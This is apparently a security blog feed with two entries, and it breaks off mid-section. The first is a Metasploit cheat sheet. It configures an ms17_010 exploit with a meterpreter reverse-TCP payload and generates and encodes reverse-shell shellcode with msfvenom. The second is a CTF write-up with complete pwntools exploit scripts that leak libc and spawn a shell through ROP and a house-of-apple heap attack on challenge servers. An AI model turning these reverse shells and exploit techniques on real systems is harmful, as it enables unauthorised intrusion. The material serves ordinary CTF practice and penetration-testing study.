        <content type="html"><![CDATA[<blockquote><p>Metasploit Framework </p></blockquote><span id="more"></span><h2 id="msfconsole"><a href="#msfconsole" class="headerlink" title="msfconsole"></a>msfconsole</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ msfconsole</span><br><span class="line">msf6 &gt; search ms17_010                                                      <span class="comment"># </span></span><br><span class="line">msf6 &gt; use 1                                                                <span class="comment"># search</span></span><br><span class="line">[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(windows/smb/ms17_010_psexec) &gt; show payloads                   <span class="comment"># payloads</span></span><br><span class="line">msf6 exploit(windows/smb/ms17_010_psexec) &gt; <span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(windows/smb/ms17_010_psexec) &gt; show options                    <span class="comment"># exploit </span></span><br><span class="line">msf6 exploit(windows/smb/ms17_010_psexec) &gt; <span class="built_in">set</span> LHOST 192.168.41.148        <span class="comment"># </span></span><br><span class="line">msf6 exploit(windows/smb/ms17_010_psexec) &gt; exploit</span><br></pre></td></tr></table></figure><p>meterpreter </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">meterpreter&gt; shell</span><br><span class="line">meterpreter&gt; background      <span class="comment"># msf</span></span><br><span class="line">msf6 exploit(windows/smb/ms17_010_psexec) &gt; session -l    <span class="comment"># session `session 0`  attach</span></span><br></pre></td></tr></table></figure><h2 id="msfvenom"><a href="#msfvenom" class="headerlink" title="msfvenom"></a>msfvenom</h2><p></p><p>payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ msfvenom -l payload | grep linux</span><br><span class="line">$ msfvenom -p linux/x86/meterpreter/reverse_tcp --list-options</span><br></pre></td></tr></table></figure><p>shellcode</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -p: payload</span></span><br><span class="line"><span class="comment"># -a: arch</span></span><br><span class="line"><span class="comment"># -f: format</span></span><br><span class="line">$ msfvenom -p linux/x86/meterpreter/reverse_tcp -a x86 --platform=linux LHOST=127.0.0.1 LPORT=9001 -f c</span><br></pre></td></tr></table></figure><p>encoderwaf</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ msfvenom --list encoders</span><br><span class="line"><span class="comment"># -e: encoder</span></span><br><span class="line"><span class="comment"># -i: iterations</span></span><br><span class="line">$ msfvenom -e php/base64 -i 10  </span><br></pre></td></tr></table></figure><h2 id="other"><a href="#other" class="headerlink" title="other"></a>other</h2><p></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ msf-pattern_create -l 100</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CSE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> msf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ichunqiu</title>
      <link href="/2024/01/28/ichunqiu%E5%86%AC%E5%AD%A3%E8%B5%9B/"/>
      <url>/2024/01/28/ichunqiu%E5%86%AC%E5%AD%A3%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<blockquote><p> </p></blockquote><span id="more"></span><h2 id="nmanager"><a href="#nmanager" class="headerlink" title="nmanager"></a>nmanager</h2><ol><li>1s seed</li><li></li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> __int64 __fastcall <span class="title">modify</span><span class="params">(<span class="type">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">24</span>]; <span class="comment">// [rsp+10h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;## select the idx you want modify ##&quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;gender: &quot;</span>);</span><br><span class="line">    <span class="built_in">read</span>(<span class="number">0</span>, &amp;a1[<span class="number">120</span> * n], <span class="number">32uLL</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;age: &quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%lld&quot;</span>, &amp;a1[<span class="number">120</span> * n + <span class="number">32</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;name: &quot;</span>);</span><br><span class="line">    <span class="built_in">read</span>(<span class="number">0</span>, &amp;a1[<span class="number">120</span> * n + <span class="number">40</span>], <span class="number">64uLL</span>);</span><br><span class="line">    <span class="built_in">printf</span>(</span><br><span class="line">      <span class="string">&quot;[idx%d]:\nname: %s\nage: %lld\ngender: %s\n&quot;</span>,</span><br><span class="line">      (<span class="type">unsigned</span> <span class="type">int</span>)n,</span><br><span class="line">      &amp;a1[<span class="number">120</span> * n + <span class="number">40</span>],</span><br><span class="line">      *(_QWORD *)&amp;a1[<span class="number">120</span> * n + <span class="number">32</span>],</span><br><span class="line">      &amp;a1[<span class="number">120</span> * n]);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;quit now?(Y/y)&quot;</span>);</span><br><span class="line">    <span class="built_in">read</span>(<span class="number">0</span>, buf, <span class="number">3uLL</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( buf[<span class="number">0</span>] != <span class="string">&#x27;y&#x27;</span> &amp;&amp; buf[<span class="number">0</span>] != <span class="string">&#x27;Y&#x27;</span> );</span><br><span class="line">  <span class="keyword">return</span> v3 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>exp</p><ul><li>got</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>(<span class="params">p, cmd=<span class="string">&quot;&quot;</span></span>):</span><br><span class="line">    gdb.attach(p, cmd)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">file = <span class="string">&quot;nmanager_patched&quot;</span></span><br><span class="line">clib = CDLL(<span class="string">&quot;libc.so.6&quot;</span>)</span><br><span class="line">elf = ELF(file, checksec=<span class="literal">False</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line">context.binary = elf</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-h&quot;</span>]</span><br><span class="line"><span class="comment"># context.timeout = 2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = elf.process()</span><br><span class="line">ip, port = <span class="string">&quot;39.106.48.123&quot;</span>, <span class="number">43714</span></span><br><span class="line">p = remote(ip, port)</span><br><span class="line">seed = clib.time(<span class="number">0</span>)</span><br><span class="line">clib.srand(seed)</span><br><span class="line">table = <span class="built_in">list</span>(<span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>)</span><br><span class="line">num = clib.rand() % <span class="number">62</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># dbg(p)</span></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;input password: &quot;</span>, table[num].encode())</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;## select the idx you want modify&quot;</span>, <span class="string">b&quot;8&quot;</span>)</span><br><span class="line">p.sendafter(<span class="string">b&quot;gender:&quot;</span>, <span class="string">b&quot;a&quot;</span> * <span class="number">0x8</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;age: &quot;</span>, <span class="string">b&quot;+&quot;</span>)</span><br><span class="line">p.sendafter(<span class="string">b&quot;name: &quot;</span>, <span class="string">b&quot;a&quot;</span> * <span class="number">0x8</span>)</span><br><span class="line">leak = u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">libc.address = leak - <span class="number">0x29d90</span></span><br><span class="line"><span class="keyword">assert</span>(libc.address &amp; <span class="number">0xfff</span> == <span class="number">0</span>)</span><br><span class="line">log.success(<span class="string">&quot;libc =&gt; %#x&quot;</span>, libc.address)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;quit now?(Y/y)&quot;</span>, <span class="string">b&quot;n&quot;</span>)</span><br><span class="line">pop_rdi_ret = libc.search(asm(<span class="string">&quot;pop rdi; ret&quot;</span>)).__next__()</span><br><span class="line">bin_sh = libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>).__next__()</span><br><span class="line">system = libc.sym.system</span><br><span class="line">ret = <span class="number">0x000000000040101a</span></span><br><span class="line"></span><br><span class="line">og = libc.address + <span class="number">0xebcf8</span></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;## select the idx you want modify&quot;</span>, <span class="string">b&quot;8&quot;</span>)</span><br><span class="line">payload = p64(<span class="number">0xdeadbeef</span>) + p64(ret) + p64(pop_rdi_ret) + p64(bin_sh)</span><br><span class="line">p.sendafter(<span class="string">b&quot;gender:&quot;</span>, payload)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;age: &quot;</span>, <span class="built_in">str</span>(system))</span><br><span class="line">p.sendafter(<span class="string">b&quot;name: &quot;</span>, <span class="string">b&quot;a&quot;</span>*<span class="number">0x10</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;quit now?(Y/y)&quot;</span>, <span class="string">b&quot;y&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="book"><a href="#book" class="headerlink" title="book"></a>book</h2><p>UAF libc2.35 <code>house of apple</code></p><ul><li> <code>tls_dtor_list</code></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/<span class="function">python3</span></span><br><span class="line"><span class="function">from pwn <span class="keyword">import</span> *</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">def <span class="title">s</span><span class="params">(data)</span>:</span></span><br><span class="line"><span class="function">    return p.send(data)</span></span><br><span class="line"><span class="function">def sa(delim, data):</span></span><br><span class="line"><span class="function">    return p.sendafter(delim, data)</span></span><br><span class="line"><span class="function">def sl(data):</span></span><br><span class="line"><span class="function">    return p.sendline(data)</span></span><br><span class="line"><span class="function">def sla(delim, data):</span></span><br><span class="line"><span class="function">    return p.sendlineafter(delim, data)</span></span><br><span class="line"><span class="function">def r(num=</span><span class="number">4096</span>):</span><br><span class="line">    <span class="keyword">return</span> p.<span class="built_in">recv</span>(num)</span><br><span class="line">def <span class="built_in">ru</span>(delim, drop=False):</span><br><span class="line">    <span class="keyword">return</span> p.<span class="built_in">recvuntil</span>(delim, drop)</span><br><span class="line">def <span class="built_in">rl</span>():</span><br><span class="line">    <span class="keyword">return</span> p.<span class="built_in">recvline</span>(timeout=<span class="number">1</span>)</span><br><span class="line">def <span class="built_in">itr</span>():</span><br><span class="line">    <span class="keyword">return</span> p.<span class="built_in">interactive</span>()</span><br><span class="line">def <span class="built_in">lg</span>(name):</span><br><span class="line">    <span class="keyword">return</span> log.<span class="built_in">success</span>(<span class="string">&quot;\033[32m%s ==&gt; 0x%x\033[0m&quot;</span> % (name, <span class="built_in">eval</span>(name)))</span><br><span class="line">def <span class="built_in">uu64</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">u64</span>(p.<span class="built_in">recvuntil</span>(b<span class="string">&quot;\x7f&quot;</span>)[<span class="number">-6</span>:].<span class="built_in">ljust</span>(<span class="number">8</span>, b<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">def <span class="built_in">uu32</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">u32</span>(p.<span class="built_in">recvuntil</span>(b<span class="string">&quot;\xf7&quot;</span>)[<span class="number">-4</span>:].<span class="built_in">ljust</span>(<span class="number">4</span>, b<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">def <span class="built_in">itob</span>(num):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(num).<span class="built_in">encode</span>()</span><br><span class="line">def <span class="built_in">dbg</span>(p, cmd=<span class="string">&quot;&quot;</span>):</span><br><span class="line">    gdb.<span class="built_in">attach</span>(p, cmd)</span><br><span class="line"></span><br><span class="line">def <span class="built_in">menu</span>(c):</span><br><span class="line">    <span class="built_in">sla</span>(b<span class="string">&quot;&gt; &quot;</span>, <span class="built_in">itob</span>(c))</span><br><span class="line">def <span class="built_in">new</span>(idx, sz):</span><br><span class="line">    <span class="built_in">menu</span>(<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">sla</span>(b<span class="string">&quot;Index:&quot;</span>, <span class="built_in">itob</span>(idx))</span><br><span class="line">    <span class="built_in">sla</span>(b<span class="string">&quot;what size :&quot;</span>, <span class="built_in">itob</span>(sz))</span><br><span class="line">def <span class="built_in">delete</span>(idx):</span><br><span class="line">    <span class="built_in">menu</span>(<span class="number">2</span>)</span><br><span class="line">    <span class="built_in">sla</span>(b<span class="string">&quot;Index:&quot;</span>, <span class="built_in">itob</span>(idx))</span><br><span class="line">def <span class="built_in">show</span>(idx):</span><br><span class="line">    <span class="built_in">menu</span>(<span class="number">3</span>)</span><br><span class="line">    <span class="built_in">sla</span>(b<span class="string">&quot;Index:&quot;</span>, <span class="built_in">itob</span>(idx))</span><br><span class="line">def <span class="built_in">edit</span>(idx, con):</span><br><span class="line">    <span class="built_in">menu</span>(<span class="number">4</span>)</span><br><span class="line">    <span class="built_in">sla</span>(b<span class="string">&quot;Index:&quot;</span>, <span class="built_in">itob</span>(idx))</span><br><span class="line">    <span class="built_in">sla</span>(b<span class="string">&quot;content: &quot;</span>, con)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">file = <span class="string">&quot;pwn_patched&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">elf = <span class="built_in">ELF</span>(file, checksec=False)</span><br><span class="line">libc = elf.libc</span><br><span class="line">context.binary = elf</span><br><span class="line">context.log_level = <span class="string">&quot;INFO&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-h&quot;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = elf.<span class="built_in">process</span>()</span><br><span class="line">ip, port = <span class="string">&quot;8.147.135.190&quot;</span>, <span class="number">24343</span></span><br><span class="line">p = <span class="built_in">remote</span>(ip, port)</span><br><span class="line"><span class="built_in">new</span>(<span class="number">10</span>, <span class="number">0x38</span>)</span><br><span class="line"><span class="built_in">new</span>(<span class="number">0</span>, <span class="number">0x428</span>)</span><br><span class="line"><span class="built_in">new</span>(<span class="number">1</span>, <span class="number">0x28</span>)</span><br><span class="line"><span class="built_in">new</span>(<span class="number">2</span>, <span class="number">0x418</span>)</span><br><span class="line"><span class="built_in">new</span>(<span class="number">3</span>, <span class="number">0x20</span>)</span><br><span class="line"><span class="built_in">new</span>(<span class="number">4</span>, <span class="number">0x500</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">delete</span>(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">show</span>(<span class="number">0</span>)</span><br><span class="line">leak = <span class="built_in">uu64</span>()</span><br><span class="line"></span><br><span class="line">libc.address = leak - <span class="number">0x219ce0</span></span><br><span class="line">system = libc.sym.system</span><br><span class="line">bin_sh = libc.<span class="built_in">search</span>(b<span class="string">&quot;/bin/sh&quot;</span>).__next__()</span><br><span class="line">IO_list_all = libc.sym._IO_list_all</span><br><span class="line"></span><br><span class="line"><span class="built_in">delete</span>(<span class="number">1</span>)</span><br><span class="line"><span class="built_in">show</span>(<span class="number">1</span>)</span><br><span class="line">heap_base = <span class="built_in">u64</span>(<span class="built_in">r</span>(<span class="number">5</span>).<span class="built_in">ljust</span>(<span class="number">8</span>, b<span class="string">&quot;\x00&quot;</span>)) &lt;&lt; <span class="number">12</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">new</span>(<span class="number">11</span>, <span class="number">0x438</span>)</span><br><span class="line"><span class="built_in">delete</span>(<span class="number">2</span>)</span><br><span class="line">payload = <span class="built_in">flat</span>(&#123;</span><br><span class="line">    <span class="number">0x18</span>: IO_list_all - <span class="number">0x20</span></span><br><span class="line">&#125;, filler = b<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line"><span class="built_in">edit</span>(<span class="number">0</span>, payload)</span><br><span class="line"><span class="built_in">new</span>(<span class="number">12</span>, <span class="number">0x438</span>)  # IO_list_all =&gt; chunk <span class="number">2</span></span><br><span class="line"></span><br><span class="line"># <span class="meta"># house of apple v2change _IO_list_all</span></span><br><span class="line">fs = <span class="built_in">FileStructure</span>()</span><br><span class="line">fs.vtable = libc.sym._IO_wfile_jumps</span><br><span class="line">fs._IO_write_base = <span class="number">0</span></span><br><span class="line">fs._IO_write_ptr = <span class="number">1</span></span><br><span class="line">fs.chain = <span class="number">0</span></span><br><span class="line">fs._wide_data = heap_base + <span class="number">0xb80</span>  # chunk4</span><br><span class="line">payload = <span class="built_in">bytes</span>(fs)[<span class="number">0x10</span>:]</span><br><span class="line"><span class="built_in">edit</span>(<span class="number">2</span>, payload)</span><br><span class="line"></span><br><span class="line">wdata = <span class="built_in">fit</span>(&#123;</span><br><span class="line">    <span class="number">0xe0</span><span class="number">-0x10</span>: heap_base + <span class="number">0xb80</span> + <span class="number">0xe0</span> + <span class="number">0x10</span>,</span><br><span class="line">    <span class="number">0xe0</span>: &#123;</span><br><span class="line">        <span class="number">0x68</span>: libc.sym.system</span><br><span class="line">    &#125;</span><br><span class="line">&#125;, filler=b<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line"><span class="built_in">edit</span>(<span class="number">4</span>, wdata)</span><br><span class="line"># _IO_wfile_overflow</span><br><span class="line"></span><br><span class="line"><span class="built_in">lg</span>(<span class="string">&quot;heap_base&quot;</span>)</span><br><span class="line"><span class="built_in">lg</span>(<span class="string">&quot;libc.address&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">edit</span>(<span class="number">1</span>, b<span class="string">&quot;a&quot;</span> * <span class="number">0x20</span> + b<span class="string">&quot;     sh;&quot;</span>)</span><br><span class="line"><span class="built_in">menu</span>(<span class="number">5</span>)</span><br><span class="line"><span class="meta"># dbg(p)</span></span><br><span class="line"><span class="built_in">itr</span>()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="HouseofSome"><a href="#HouseofSome" class="headerlink" title="HouseofSome"></a>HouseofSome</h2><p>glibc2.38 patchpatch <code>_IO_wide_data</code>  <strong></strong> house of </p><figure class="highlight patch"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">diff --git a/libio/libioP.h b/libio/libioP.h</span></span><br><span class="line"><span class="comment">index 745278e..b3858d1 100644</span></span><br><span class="line"><span class="comment">--- a/libio/libioP.h</span></span><br><span class="line"><span class="comment">+++ b/libio/libioP.h</span></span><br><span class="line"><span class="meta">@@ -100,7 +100,7 @@</span></span><br><span class="line"> #define _IO_JUMPS_FILE_plus(THIS) \</span><br><span class="line">   _IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE_plus, vtable)</span><br><span class="line"> #define _IO_WIDE_JUMPS(THIS) \</span><br><span class="line"><span class="deletion">-  _IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE, _wide_data)-&gt;_wide_vtable</span></span><br><span class="line"><span class="addition">+  (IO_validate_vtable(_IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE, _wide_data)-&gt;_wide_vtable))</span></span><br><span class="line"> #define _IO_CHECK_WIDE(THIS) \</span><br><span class="line">   (_IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE, _wide_data) != NULL)</span><br></pre></td></tr></table></figure><p>patchrunpath</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ gcc -Wl,-R/path/to/library xxx.c                   <span class="comment"># libc</span></span><br><span class="line">$ <span class="built_in">export</span> LD_RUN_PATH=/path/to/library  <span class="comment"># </span></span><br><span class="line">$ ldd houseofsome</span><br><span class="line">linux-vdso.so.1 (0x00007ffcca981000)</span><br><span class="line">libc.so.6 =&gt; ./libc.so.6 (0x00007fbff2200000)</span><br><span class="line">./ld-linux-x86-64.so.2 =&gt; /lib64/ld-linux-x86-64.so.2 (0x00007fbff24e6000)</span><br></pre></td></tr></table></figure><p>mmap </p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; vmmap</span><br><span class="line"><span class="number">0x114514000</span>        <span class="number">0x114515000</span> rw-p     <span class="number">1000</span>      <span class="number">0</span> [anon_114514] </span><br></pre></td></tr></table></figure><p>draw offset</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> __int64 <span class="title">draw</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 offset; <span class="comment">// [rsp+0h] [rbp-120h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+118h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( !magic</span><br><span class="line">    &amp;&amp; dev</span><br><span class="line">    &amp;&amp; name</span><br><span class="line">    &amp;&amp; (<span class="built_in">printf</span>(<span class="string">&quot;offset&gt; &quot;</span>), offset = <span class="built_in">getint</span>(), <span class="built_in">printf</span>(<span class="string">&quot;length&gt; &quot;</span>), (<span class="type">unsigned</span> __int64)<span class="built_in">getint</span>() &lt;= <span class="number">8</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">fread</span>((<span class="type">void</span> *)(offset + <span class="number">0x114514000</span>LL), <span class="number">1uLL</span>, <span class="number">1uLL</span>, dev);</span><br><span class="line">    magic = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;wrong.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p></p><ul><li>fopenmalloc<code>_IO_FILE</code><code>_IO_list_all</code>libc</li><li>scanf  <code>+/-</code> </li></ul><p>HouseOfSomeWP<a href="https://mp.weixin.qq.com/s/BBc-HCET6W91-tpVSs4PxQ">2023WEBPWN</a></p><h2 id="upx2023"><a href="#upx2023" class="headerlink" title="upx2023"></a>upx2023</h2><p>010editor <code>upx</code>  <code>UPX</code>, <code>upx -d</code> </p><p></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 